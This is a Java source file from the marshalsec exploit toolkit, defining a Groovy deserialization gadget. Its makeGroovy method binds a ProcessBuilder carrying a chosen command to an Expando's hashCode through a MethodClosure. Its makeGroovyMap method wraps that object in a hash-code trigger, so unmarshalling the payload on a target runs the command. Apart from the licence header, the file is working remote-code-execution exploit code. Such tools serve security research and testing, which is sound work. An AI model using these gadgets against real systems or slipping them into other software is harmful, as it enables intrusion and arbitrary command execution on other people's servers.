/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import org.codehaus.groovy.runtime.MethodClosure;

import groovy.util.Expando;
import marshalsec.MarshallerBase;
import marshalsec.UtilFactory;


/**
 * @author mbechler
 *
 */
public interface Groovy extends Gadget {

    @Primary
    @Args ( minArgs = 1, args = {
        "cmd", "args.."
    }, defaultArgs = {
        MarshallerBase.defaultExecutable
    } )
    default Object makeGroovyMap ( UtilFactory uf, String[] args ) throws Exception {
        Object e = makeGroovy(args);
        return uf.makeHashCodeTrigger(e);
    }


    @Args ( minArgs = 1, args = {
        "cmd", "args.."
    }, defaultArgs = {
        MarshallerBase.defaultExecutable
    } )
    default Object makeGroovy ( String[] args ) throws Exception {
        Expando expando = new Expando();
        ProcessBuilder pb = new ProcessBuilder(args);
        MethodClosure mc = new MethodClosure(pb, "start");
        expando.setProperty("hashCode", mc);
        return expando;
    }
}
